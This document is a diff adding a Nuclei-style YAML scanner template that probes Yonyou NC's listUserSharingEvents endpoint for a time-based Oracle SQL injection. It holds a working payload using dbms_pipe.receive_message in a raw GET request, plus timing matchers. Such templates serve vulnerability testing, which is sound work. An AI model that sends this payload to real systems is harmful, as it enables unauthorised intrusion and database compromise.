@@ -1,0 +1,38 @@
+id: yonyou-nc-listUserSharingEvents-sqli
+info:
+  name: 用友NC listUserSharingEvents 存在SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/gelusus/wxvl/blob/6ad8b88dbb4a02cb1fc0fa75d148a194454dd716/doc/2025-07/%E3%80%902025%E6%8A%A4%E7%BD%91%E6%BC%8F%E6%B4%9EPOC%E9%80%9F%E5%AD%98%E3%80%91%E5%90%83%E8%8B%95%E7%9A%AE%E5%96%9D%E6%8C%AA%E7%93%A6%EF%BC%8CHW%E8%BD%BB%E6%9D%BE%E6%8B%BF%E6%8D%8F.md?plain=1#L183
+    - https://github.com/crushforyou/2025hvv-poc/blob/b1cfb1bc795f9baf88cc1b882b705ecf3666c698/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8BNC%20listUserSharingEvents%20%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5/%E7%94%A8%E5%8F%8BNC%20listUserSharingEvents%20%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,yonyou,nc
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /portal/pt/oacoSchedulerEvents/listUserSharingEvents?agent=1')+AND+1=dbms_pipe.receive_message('RDS',5)--&pageId=login&sch_ed=2&sch_sd=1 HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - duration >= 5 && duration < 9
+        condition: and
